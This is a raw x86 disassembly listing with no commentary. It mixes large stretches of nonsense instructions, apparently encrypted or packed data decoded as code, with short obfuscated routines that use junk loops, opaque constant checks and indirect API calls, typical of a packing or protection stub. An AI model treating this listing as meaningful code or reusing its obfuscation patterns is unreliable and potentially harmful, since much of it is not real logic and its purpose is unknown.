  407cdd:	shl    BYTE PTR [esp+eiz*2-0x2039cc86],0x49
  407ce5:	xchg   edi,eax
  407ce6:	add    BYTE PTR [edx],dh
  407ce8:	int    0x5
  407cea:	cdq    
  407ceb:	rol    BYTE PTR [edi+0x52],1
  407cee:	and    dl,bh
  407cf0:	jp     0x407d00
  407cf2:	enter  0x6ac0,0x59
  407cf6:	mov    ds:0xcede0e47,al
  407cfb:	lods   eax,DWORD PTR ds:[esi]
  407cfc:	fstp   QWORD PTR [eax-0x12]
  407cff:	(bad)  
  407d00:	imul   edx,DWORD PTR [esi-0x7095d1c3],0x32
  407d07:	out    dx,al
  407d08:	aad    0xc4
  407d0a:	rcr    BYTE PTR [esi],1
  407d0c:	sbb    al,0x5e
  407d0e:	pop    ebp
  407d0f:	jns    0x30c2d52b
  407d15:	mov    DWORD PTR [ebp+ebx*4-0x6d],edi
  407d19:	sub    eax,0x256d7317
  407d1e:	icebp  
  407d1f:	sub    esi,ecx
  407d21:	xor    DWORD PTR [edx-0x1b],edi
  407d24:	mov    ebx,0xc5cc09f4
  407d29:	mov    cl,0x6c
  407d2b:	adc    eax,0xd4aa2f8c
  407d30:	rcr    DWORD PTR [ebp+0x75dd5404],0xd6
  407d37:	pop    ds
  407d38:	mov    ds:0x799d96ab,al
  407d3d:	aas    
  407d3e:	pop    ds
  407d3f:	xor    al,0x8b
  407d41:	in     al,dx
  407d42:	hlt    
  407d43:	pop    ds
  407d44:	adc    BYTE PTR [ebx],dl
  407d46:	sub    BYTE PTR [edi],bh
  407d48:	stos   DWORD PTR es:[edi],eax
  407d49:	push   esp
  407d4a:	jno    0x407cf9
  407d4c:	xor    edx,DWORD PTR ds:0xc542642a
  407d52:	inc    esi
  407d53:	in     al,dx
  407d54:	adc    eax,0x5d1f00f8
  407d59:	sbb    dl,0x47
  407d5c:	sahf   
  407d5d:	lock xchg DWORD PTR [esp+ebx*1+0x543ab734],edx
  407d65:	js     0x407d3a
  407d67:	sub    eax,0x5d9b0b32
  407d6c:	cdq    
  407d6d:	sub    al,0x47
  407d6f:	mov    ?,WORD PTR [ebp+0x2f5e787f]
  407d75:	test   bh,al
  407d77:	out    dx,eax
  407d78:	jb     0x407dec
  407d7a:	into   
  407d7b:	mov    edi,edx
  407d7d:	fnsave [ebx-0x6d]
  407d80:	cld    
  407d81:	cld    
  407d82:	sbb    bh,bl
  407d84:	nop
  407d85:	cmc    
  407d86:	sbb    eax,0xf6b2d8d0
  407d8b:	int    0x4d
  407d8d:	int    0x9d
  407d8f:	test   al,0x18
  407d91:	scas   eax,DWORD PTR es:[edi]
  407d92:	hlt    
  407d93:	mov    ah,0xa0
  407d95:	sbb    al,0x93
  407d97:	aam    0x3d
  407d99:	scas   eax,DWORD PTR es:[edi]
  407d9a:	fdiv   DWORD PTR [ecx+0x77]
  407d9d:	xor    ah,BYTE PTR [edi-0x1749dc8f]
  407da3:	pop    edi
  407da4:	xchg   esp,eax
  407da5:	std    
  407da6:	cwde   
  407da7:	pop    edi
  407da8:	push   ds
  407da9:	pop    edi
  407daa:	hlt    
  407dab:	cmovge edi,DWORD PTR [esi+0x37]
  407daf:	outs   dx,BYTE PTR ds:[esi]
  407db0:	adc    bl,BYTE PTR [edi-0x22]
  407db3:	inc    ebx
  407db4:	loope  0x407e1f
  407db6:	mov    esi,0xb23cc8f0
  407dbb:	add    DWORD PTR [ebx-0x4689960f],0x55a978f5
  407dc5:	(bad)  
  407dc6:	xor    cl,BYTE PTR [ecx-0x39]
  407dc9:	and    DWORD PTR [ebx],eax
  407dcb:	fisubr DWORD PTR [edi+0x3c]
  407dce:	inc    esi
  407dcf:	popa   
  407dd0:	ror    ah,1
  407dd2:	cs fs mov esi,0x99ba5f41
  407dd9:	add    ebx,0xea9c4af3
  407ddf:	push   eax
  407de0:	nop    DWORD PTR [ecx]
  407de3:	ret    
  407de4:	cli    
  407de5:	rcr    bh,cl
  407de7:	test   BYTE PTR [esi+0x79c2d05b],cl
  407ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dee:	xlat   BYTE PTR ds:[ebx]
  407def:	mov    bh,0x64
  407df1:	jge    0x407e27
  407df3:	add    ebp,esp
  407df5:	mov    dh,0x4c
  407df7:	adc    BYTE PTR [esp+ecx*1],0x53
  407dfb:	and    ecx,DWORD PTR [ecx+edx*1]
  407dfe:	add    dl,BYTE PTR [esi+0x40fe17a2]
  407e04:	push   eax
  407e05:	clc    
  407e06:	(bad)  
  407e07:	das    
  407e08:	(bad)  
  407e09:	in     eax,0x9f
  407e0b:	or     eax,0xdb310e31
  407e10:	scas   eax,DWORD PTR es:[edi]
  407e11:	ds pop ebp
  407e13:	mov    WORD PTR [eax-0x3b638208],ss
  407e19:	scas   al,BYTE PTR es:[edi]
  407e1a:	jl     0x407e5f
  407e1c:	xor    eax,0xa7384bd4
  407e21:	add    al,0x54
  407e23:	(bad)  
  407e24:	outs   dx,BYTE PTR ds:[esi]
  407e25:	ret    0xcb8
  407e28:	adc    esp,DWORD PTR [ecx-0xe1ef358]
  407e2e:	xchg   ebp,eax
  407e2f:	sahf   
  407e30:	not    DWORD PTR [ebp+0x74]
  407e33:	call   0x7d0d5477
  407e38:	lods   eax,DWORD PTR ds:[esi]
  407e39:	loopne 0x407e08
  407e3b:	xlat   BYTE PTR ds:[ebx]
  407e3c:	cmp    al,0xc8
  407e3e:	in     al,dx
  407e3f:	scas   eax,DWORD PTR es:[edi]
  407e40:	cld    
  407e41:	sar    DWORD PTR [edi+0x19],1
  407e44:	lods   eax,DWORD PTR ds:[esi]
  407e45:	addr16 aas 
  407e47:	(bad)  
  407e48:	cld    
  407e49:	mov    edx,0x77508c84
  407e4e:	cld    
  407e4f:	jne    0x407e4e
  407e51:	or     eax,0x2ed090c5
  407e56:	loope  0x407ed1
  407e58:	loop   0x407e54
  407e5a:	xchg   edx,eax
  407e5b:	mov    esp,0x29d9e8af
  407e60:	inc    edx
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4336eb
  407f81:	or     DWORD PTR ds:0x4336ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433757,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433753,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43379b
  407fad:	sub    DWORD PTR ds:0x433727,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4336db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43372b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43372b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43372b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43372b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43372b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433967
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43372b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43372b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43372b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43372b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43372b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43372b,ebx
  408048:	cmp    DWORD PTR ds:0x43372b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43372b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43372b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43372b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43372b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43367b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43375b
  4080b1:	and    DWORD PTR ds:0x433763,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43371b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4337a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4337a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4337a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4337a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43375b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4337a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4337a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4337a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4337a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433797,0x1f
  40813b:	cmp    DWORD PTR ds:0x433797,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433797,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433797
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433797,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x518fad0d
  408191:	mov    ah,0x3e
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	ins    BYTE PTR es:[edi],dx
  40819b:	mov    bh,0xb7
  40819d:	mov    ecx,0x6291efca
  4081a2:	ds sbb bh,al
  4081a5:	push   edx
  4081a6:	hlt    
  4081a7:	mov    ds:0xb44f80b3,al
  4081ac:	popa   
  4081ad:	fbstp  TBYTE PTR [ecx]
  4081af:	pop    edi
  4081b0:	fcom   DWORD PTR [edx-0x41]
  4081b3:	je     0x40819f
  4081b5:	shl    dh,0xf0
  4081b8:	push   es
  4081b9:	fwait
  4081ba:	aam    0x1c
  4081bc:	sub    eax,0x213bd1d
  4081c1:	call   0x5063:0xa217bb85
  4081c8:	push   eax
  4081c9:	(bad)  
  4081ca:	aaa    
  4081cb:	test   BYTE PTR [ebp*4-0x35a53d30],bl
  4081d2:	in     eax,dx
  4081d3:	jo     0x40817c
  4081d5:	add    ebp,DWORD PTR [ebp+0x597b44d6]
  4081db:	xor    ebp,DWORD PTR [ebx]
  4081dd:	cmp    DWORD PTR [edi-0x16],0xfffffffc
  4081e1:	push   edi
  4081e2:	and    ecx,ecx
  4081e4:	popf   
  4081e5:	arpl   si,bp
  4081e7:	xchg   ebp,eax
  4081e8:	lock push ds
  4081ea:	xchg   esp,eax
  4081eb:	jmp    0xf49e:0xbf36ee33
  4081f2:	loopne 0x4081f1
  4081f4:	inc    ebp
  4081f5:	cwde   
  4081f6:	shl    BYTE PTR ds:0x32ddaf2a,1
  4081fc:	or     BYTE PTR [edx+ecx*2-0x7c],bh
  408200:	call   0x78f7737
  408205:	shr    BYTE PTR [esi],1
  408207:	fst    QWORD PTR [ecx+0x3733b024]
  40820d:	jmp    0x9679:0x58337eaf
  408214:	add    al,0x36
  408216:	mov    bh,ah
  408218:	es dec edi
  40821a:	add    al,dh
  40821c:	mov    dl,0x30
  40821e:	push   esi
  40821f:	sub    al,0x47
  408221:	cmp    eax,0x9c07ba22
  408226:	stc    
  408227:	mov    dh,0x6e
  408229:	pop    ebp
  40822a:	imul   esp,DWORD PTR [edx+esi*1+0x76c9e824],0x8
  408232:	jecxz  0x40821e
  408234:	out    0x43,eax
  408236:	dec    DWORD PTR [ebp-0x177a413f]
  40823c:	jae    0x40824a
  40823e:	fst    DWORD PTR [ebx]
  408240:	(bad)
  408243:	dec    esp
  408244:	ins    DWORD PTR es:[edi],dx
  408245:	nop
  408246:	mov    eax,0x6359aa59
  40824b:	sbb    BYTE PTR [esi-0x3d],bh
  40824e:	pop    ebx
  40824f:	(bad)  
  408250:	test   eax,0x3ca6ffc8
  408255:	jge    0x40828b
  408257:	retf   0x88b3
  40825a:	addr16 out dx,eax
  40825c:	fwait
  40825d:	pop    edi
  40825e:	nop
  40825f:	xchg   DWORD PTR [esi*2-0x3ffa14c],edi
  408266:	jle    0x4081fd
  408268:	les    eax,FWORD PTR [edi]
  40826a:	mov    ds:0x3524baa,al
  40826f:	sbb    DWORD PTR [eax+esi*4+0x77],edi
  408273:	lods   eax,DWORD PTR ds:[esi]
  408274:	inc    esp
  408275:	js     0x408263
  408277:	jg     0x40827b
  408279:	out    dx,al
  40827a:	adc    eax,esi
  40827c:	rsqrtps xmm2,xmm6
  40827f:	mov    al,0x56
  408281:	(bad)  
  408282:	fmul   QWORD PTR [edi]
  408284:	and    ch,BYTE PTR [esi-0x58]
  408287:	jb     0x4082ac
  408289:	in     al,dx
  40828a:	mov    ecx,0xbab19535
  40828f:	fld    TBYTE PTR [edi+eax*4-0x16]
  408293:	sub    BYTE PTR [ecx+ecx*1],0x19
  408297:	mov    esi,DWORD PTR [ebx-0x40]
  40829a:	fisttp QWORD PTR [edx]
  40829c:	aam    0xce
  40829e:	mul    BYTE PTR [edx+edi*2]
  4082a1:	cmp    DWORD PTR [edx],esi
  4082a3:	dec    edx
  4082a4:	pusha  
  4082a5:	add    BYTE PTR [edx-0x4dc7004c],0x62
  4082ac:	pop    edx
  4082ad:	and    edx,ebp
  4082af:	xor    edx,DWORD PTR [ecx-0xe0d4ba0]
  4082b5:	out    dx,al
  4082b6:	or     dl,dh
  4082b8:	test   BYTE PTR [ebx-0x6f82b7d],0x37
  4082bf:	stc    
  4082c0:	inc    ecx
  4082c1:	mov    BYTE PTR [ebx+0xc67351d],dl
  4082c7:	popf   
  4082c8:	mov    eax,ds:0xcbd86603
  4082cd:	ins    BYTE PTR es:[edi],dx
  4082ce:	xchg   ecx,eax
  4082cf:	(bad)  
  4082d0:	cmp    al,BYTE PTR [ebp-0x3ae15dd0]
  4082d6:	aad    0xe4
  4082d8:	adc    DWORD PTR [esi-0x478efa8e],esp
  4082de:	pop    ebp
  4082df:	out    dx,eax
  4082e0:	push   0x75
  4082e2:	add    BYTE PTR [ebp-0x30f01531],ah
  4082e8:	cmp    ebx,ecx
  4082ea:	xchg   esp,eax
  4082eb:	clc    
  4082ec:	and    eax,0x143383e8
  4082f1:	pop    edx
  4082f2:	scas   al,BYTE PTR es:[edi]
  4082f3:	(bad)  
  4082f4:	in     al,dx
  4082f5:	fstp   TBYTE PTR [eax]
  4082f7:	les    esp,FWORD PTR [esi-0x53a6bb87]
  4082fd:	mov    ds:0x87a1b656,eax
  408302:	js     0x40828d
  408304:	jbe    0x408377
  408306:	sbb    dl,BYTE PTR ds:0x5173fab
  40830c:	dec    ebp
  40830d:	lea    esp,[eax]
  40830f:	xor    eax,0xc7f93916
  408314:	pop    esi
  408315:	loopne 0x408323
  408317:	cld    
  408318:	inc    edi
  408319:	mov    ecx,0x6317f066
  40831e:	adc    ah,dh
  408320:	jge    0x4082b0
  408322:	call   0xc42a26d2
  408327:	in     eax,dx
  408328:	sub    al,0xec
  40832a:	dec    ebx
  40832b:	fldz   
  40832d:	ins    BYTE PTR es:[edi],dx
  40832e:	ds test ebx,edx
  408331:	jmp    0x1cd8:0xc62aa4c1
  408338:	or     BYTE PTR [ebx-0xa8ed6ef],ch
  40833e:	jmp    0x4083a1
  408340:	hlt    
  408341:	push   edi
  408342:	mov    ebp,0xb00ed5d4
  408347:	aas    
  408348:	xchg   BYTE PTR [ebx],dl
  40834a:	xchg   al,cl
  40834c:	sti    
  40834d:	jmp    0xd4f7:0x8c555d64
  408354:	and    bl,dh
  408356:	out    0x85,al
  408358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408359:	js     0x408368
  40835b:	mov    al,0x4e
  40835d:	je     0x4083da
  40835f:	sub    al,0xb8
  408361:	sbb    ebp,DWORD PTR [esi+ebp*1]
  408364:	rcr    edi,1
  408366:	or     eax,0x92ae1e1d
  40836b:	or     DWORD PTR ds:0x3fcc0f31,0xffffffa0
  408372:	mov    dl,0x86
  408374:	loope  0x4083b4
  408376:	call   0xc154adc0
  40837b:	xchg   ecx,eax
  40837c:	jae    0x408341
  40837e:	inc    edx
  40837f:	push   ebx
  408380:	imul   ebp,DWORD PTR [eax+0x46],0x54
  408384:	scas   eax,DWORD PTR es:[edi]
  408385:	dec    BYTE PTR [eax-0x12]
  408388:	xor    BYTE PTR [edx],bl
  40838a:	cmp    edx,eax
  40838c:	js     0x40831f
  40838e:	int    0x1d
  408390:	xor    eax,DWORD PTR [ebx-0xb42e779]
  408396:	in     eax,dx
  408397:	push   ecx
  408398:	xor    dh,dh
  40839a:	sbb    eax,0xe896ea33
  40839f:	retf   
  4083a0:	fisttp DWORD PTR [edx+ebx*4]
  4083a3:	pop    esi
  4083a4:	mov    ebx,0x1e892a49
  4083a9:	lods   al,BYTE PTR ds:[esi]
  4083aa:	retf   0xb6ca
  4083ad:	popf   
  4083ae:	xchg   edx,eax
  4083af:	add    bl,BYTE PTR [ebx]
  4083b1:	xchg   esi,eax
  4083b2:	pop    eax
  4083b3:	shl    BYTE PTR [ebx-0x41],0x26
  4083b7:	dec    eax
  4083b8:	push   esp
  4083b9:	out    dx,al
  4083ba:	test   BYTE PTR [ecx-0x4c691928],0x2f
  4083c1:	(bad)  
  4083c3:	mov    ah,0x89
  4083c5:	inc    ebp
  4083c6:	loopne 0x408349
  4083c8:	and    eax,0x4336db
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x4336db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4336db,eax
  4083dc:	cmp    DWORD PTR ds:0x4336db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4336db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4336db
  40840c:	inc    eax
  40840d:	mov    ds:0x4336db,eax
  408412:	cmp    DWORD PTR ds:0x4336db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43368b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433693,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4337a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	xchg   esp,eax
  408465:	das    
  408466:	aad    0xf8
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	lods   al,BYTE PTR ds:[esi]
  408471:	out    0x77,eax
  408473:	mov    edi,0xb59b29b0
  408478:	js     0x40845b
  40847a:	jecxz  0x40844f
  40847c:	int    0xba
  40847e:	jnp    0x408485
  408480:	inc    eax
  408481:	mov    dl,0x4a
  408483:	loop   0x408447
  408485:	push   edi
  408486:	pop    ss
  408487:	sbb    al,0xf8
  408489:	int3   
  40848a:	sbb    al,0x5
  40848c:	lds    edx,FWORD PTR [esi-0x72]
  40848f:	pop    edi
  408490:	sub    al,0x6d
  408492:	iret   
  408493:	(bad)  
  408494:	sub    ebx,DWORD PTR [esi+ebp*1-0x364935a6]
  40849b:	shl    DWORD PTR [edx-0x30],cl
  40849e:	addr16 pop es
  4084a0:	test   BYTE PTR [esi-0x75],bl
  4084a3:	jb     0x4084c1
  4084a5:	inc    ebx
  4084a6:	mov    dl,0xf3
  4084a8:	icebp  
  4084a9:	mov    edi,esi
  4084ab:	mov    dl,0x68
  4084ad:	aaa    
  4084ae:	dec    ebp
  4084af:	icebp  
  4084b0:	push   ebx
  4084b1:	add    BYTE PTR [eax+0x2b769d0c],ch
  4084b7:	add    bl,ch
  4084b9:	pop    es
  4084ba:	daa    
  4084bb:	in     al,0xfc
  4084bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084be:	cwde   
  4084bf:	xor    al,0x44
  4084c1:	lds    ebx,FWORD PTR [edx-0x27]
  4084c4:	call   0x8072:0x8ab35a8f
  4084cb:	xor    eax,0xf56d10d9
  4084d0:	bound  ebx,QWORD PTR [edx+0x4fc6f7ff]
  4084d6:	js     0x40849e
  4084d8:	cmp    eax,0x8b3400d9
  4084dd:	test   BYTE PTR [esi-0x6e],ah
  4084e0:	cld    
  4084e1:	psrlw  mm3,QWORD PTR [edx]
  4084e4:	sub    ebp,eax
  4084e6:	sub    BYTE PTR [edx-0x945a8cf],0xd2
  4084ed:	xchg   esi,eax
  4084ee:	push   cs
  4084ef:	mov    ch,0x98
  4084f1:	or     al,0x65
  4084f3:	sysret 
  4084f5:	cli    
  4084f6:	xchg   ebp,eax
  4084f7:	outs   dx,BYTE PTR ds:[esi]
  4084f8:	pop    ecx
  4084f9:	mov    ds:0x6dd9ad34,eax
  4084fe:	out    0x20,al
  408500:	push   0x7f
  408502:	sti    
  408503:	mov    ds:0xabe4bf76,eax
  408508:	pusha  
  408509:	pop    es
  40850a:	icebp  
  40850b:	push   eax
  40850c:	outs   dx,DWORD PTR cs:[esi]
  40850e:	adc    dh,BYTE PTR [eax-0x67ba3d9f]
  408514:	sub    edi,DWORD PTR [esp+eiz*2+0x61]
  408518:	mov    al,0xdb
  40851a:	dec    ecx
  40851b:	inc    ebx
  40851c:	ins    BYTE PTR es:[edi],dx
  40851d:	inc    ebp
  40851e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40851f:	push   es
  408520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408521:	stos   DWORD PTR es:[edi],eax
  408522:	int    0x91
  408524:	push   ds
  408525:	int3   
  408526:	push   ebp
  408527:	inc    eax
  408528:	pop    edi
  408529:	aaa    
  40852a:	(bad)  
  40852b:	fs xchg BYTE PTR fs:[ecx+0x2a],ah
  408530:	and    edi,DWORD PTR [esi-0x16f1b5e8]
  408536:	jnp    0x4084c5
  408538:	and    eax,0x10c7bd2a
  40853d:	inc    ebx
  40853e:	add    esp,DWORD PTR [ebp+0x2ddcbf30]
  408544:	cwde   
  408545:	dec    eax
  408546:	mov    ch,BYTE PTR [ebx+0x4e]
  408549:	das    
  40854a:	pop    ebx
  40854b:	push   ebp
  40854c:	pop    ebx
  40854d:	lock mov ch,0xde
  408550:	enter  0x9aac,0xb4
  408554:	nop
  408555:	pop    ds
  408556:	and    ah,al
  408558:	repz (bad) 
  40855a:	xor    bh,BYTE PTR ds:0xd672eaf8
  408560:	fisttp QWORD PTR [edx-0x3d]
  408563:	pop    eax
  408564:	jno    0x4084fb
  408566:	adc    eax,edx
  408568:	dec    esi
  408569:	cmp    bh,al
  40856b:	xchg   ecx,eax
  40856c:	out    0xb3,eax
  40856e:	mov    cl,0x3e
  408570:	jp     0x40857a
  408572:	ins    DWORD PTR es:[edi],dx
  408573:	sahf   
  408574:	mov    WORD PTR [esi-0x6fe2b854],gs
  40857a:	mov    ecx,0x2486c8be
  40857f:	outs   dx,DWORD PTR ds:[esi]
  408580:	mov    eax,ds:0xf0f481c2
  408585:	push   ebx
  408586:	sti    
  408587:	jo     0x40852f
  408589:	inc    ebx
  40858a:	cs sbb esp,edi
  40858d:	call   0x4c747734
  408592:	popf   
  408593:	in     al,dx
  408594:	pop    ebx
  408595:	push   cs
  408596:	test   ebp,edx
  408598:	jle    0x4085c1
  40859a:	inc    edi
  40859b:	push   ds
  40859c:	nop
  40859d:	push   esi
  40859e:	or     DWORD PTR [eax+eax*2],edi
  4085a1:	ds xor al,0x13
  4085a4:	push   edx
  4085a5:	inc    BYTE PTR [ecx+0x30]
  4085a8:	pop    ecx
  4085a9:	sbb    eax,0xc5ef6eae
  4085af:	call   0xab489edc
  4085b4:	std    
  4085b5:	std    
  4085b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085b7:	dec    ebp
  4085b8:	jno    0x408581
  4085ba:	dec    esi
  4085bb:	test   ebx,edi
  4085bd:	mov    esp,0xd8954b5e
  4085c2:	je     0x4085e7
  4085c4:	out    0xdd,eax
  4085c6:	jb     0x40863d
  4085c8:	mov    bl,0xae
  4085ca:	aas    
  4085cb:	cmp    al,0xff
  4085cd:	in     al,0xad
  4085cf:	out    dx,eax
  4085d0:	sub    DWORD PTR [eax+eiz*4],eax
  4085d3:	push   DWORD PTR [ebx-0x1e06618a]
